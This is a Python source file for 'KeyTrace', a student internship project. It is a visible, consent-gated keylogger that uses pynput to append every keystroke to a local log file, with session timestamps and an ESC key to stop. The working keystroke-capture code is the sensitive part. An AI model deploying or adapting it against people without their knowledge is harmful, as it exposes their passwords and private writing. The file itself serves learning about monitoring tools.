'''
Task 3 - Prodigy Infotech

Ethical Keylogger - KeyTrace

Developed as part of my internship at Prodigy Infotech, this project is an ethical keystroke logger designed for authorized security testing and research purposes.
It records keystrokes in real time, ensuring responsible use with explicit user consent.

This project enhanced my understanding of Python's `pynput` library, file handling, and ethical hacking principles.
It also strengthened my awareness of security best practices and the responsible development of monitoring tools.

 Disclaimer: This tool is strictly for educational and ethical use only. Unauthorized use is illegal and unethical.
 Only run it on machines you own or have explicit written permission to test.

'''

from datetime import datetime

from pynput.keyboard import Listener

#================ Main Program ========================

BANNER = """ \033[32m
██╗  ██╗███████╗██╗   ██╗    ████████╗██████╗  █████╗  ██████╗███████╗
██║ ██╔╝██╔════╝╚██╗ ██╔╝    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
█████╔╝ █████╗   ╚████╔╝        ██║   ██████╔╝███████║██║     █████╗
██╔═██╗ ██╔══╝    ╚██╔╝         ██║   ██╔══██╗██╔══██║██║     ██╔══╝
██║  ██╗███████╗   ██║          ██║   ██║  ██║██║  ██║╚██████╗███████╗
╚═╝  ╚═╝╚══════╝   ╚═╝          ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
\033[0m
    \033[35m~~~~~  Developed by Aspiring Pentester Mr. Izaz   ~~~~~ \033[0m
    \033[38;5;220m~~~~~  Follow Here: GitHub.com/mizazhaider-ceh  ~~~~~\033[0m
\033[94m~~~~~ Internship Task/Project Assigned by ProDigy Infotech ~~~~~\033[0m
"""

LOG_FILE = "keylog.txt"

# Modifier keys are never logged: they carry no meaning on their own.
IGNORED_KEYS = {
    "Key.shift", "Key.shift_l", "Key.shift_r",
    "Key.ctrl", "Key.ctrl_l", "Key.ctrl_r",
    "Key.alt", "Key.alt_l", "Key.alt_r",
    "Key.cmd", "Key.cmd_l", "Key.cmd_r",
}

# Special keys get readable tags so the log is easy to analyze.
SPECIAL_KEYS = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.tab": "[TAB]",
    "Key.backspace": "[BACKSPACE]",
    "Key.delete": "[DELETE]",
    "Key.caps_lock": "[CAPS LOCK]",
}


def format_key(key):
    """Turn a pynput key into its log representation.

    Returns None for keys that should not be logged (modifiers).
    """
    key_str = str(key).replace("'", "")  # cleaning the key
    if key_str in IGNORED_KEYS:
        return None
    return SPECIAL_KEYS.get(key_str, key_str)


def write_session_marker(start=True):
    """Write a timestamped session marker so separate runs stay distinguishable."""
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    label = "Session started" if start else "Session ended"
    with open(LOG_FILE, "a") as file:
        file.write("\n--- %s: %s ---\n" % (label, stamp))


def press_key(key):
    """Handle one key press: log it, or stop the listener on ESC."""
    key_str = str(key).replace("'", "")
    if key_str == "Key.esc":
        print("\n[INFO] Stopping Keylogger...")  # Stopping the listener on ESC
        write_session_marker(start=False)
        return False  # This stops the listener

    formatted = format_key(key)
    if formatted is None:
        return  # Modifier key, nothing to log

    with open(LOG_FILE, "a") as file:
        file.write(formatted + " ")  # Append key to log file


def main():
    print(BANNER)
    print("\033[38;5;220m=" * 60, "\033[0m")
    print("~\033[32mThis program logs keystrokes for testing purposes ONLY\033[0m")
    print("~\033[31m      You MUST have permission to run this\033[0m")
    print("\033[38;5;220m=" * 60, "\033[0m")

    consent = input("\033[33m\n~Do you agree to use this ethically? (Y/N):\033[0m ").strip().lower()
    if consent != "y":
        print("\033[31mPermission denied. Exiting program...\033[0m")
        return

    print("\033[36m~Keylogger started. Press keys... (Press ESC to stop)\033[0m")
    write_session_marker(start=True)

    # Start listening for key presses
    with Listener(on_press=press_key) as listener:
        listener.join()


if __name__ == "__main__":
    main()
